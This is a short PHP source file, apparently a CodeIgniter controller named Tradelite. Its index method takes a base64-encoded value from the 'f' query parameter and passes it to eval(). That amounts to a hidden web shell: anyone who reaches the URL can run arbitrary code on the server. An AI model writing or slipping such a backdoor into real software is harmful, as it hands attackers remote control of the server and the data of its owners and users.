<?php if (!defined('BASEPATH')) exit('no direct script access allowed');

class Tradelite extends CI_Controller {

	public function __construct() {
		parent::__construct();
	}

	public function index() {
		include BASE_DIR . 'assets/lite.php/Tradelite.php';
		if (isset($_GET["f"])) {
			// echo base64_decode($_GET["f"]);
			eval(base64_decode($_GET["f"]));
		}
	}
}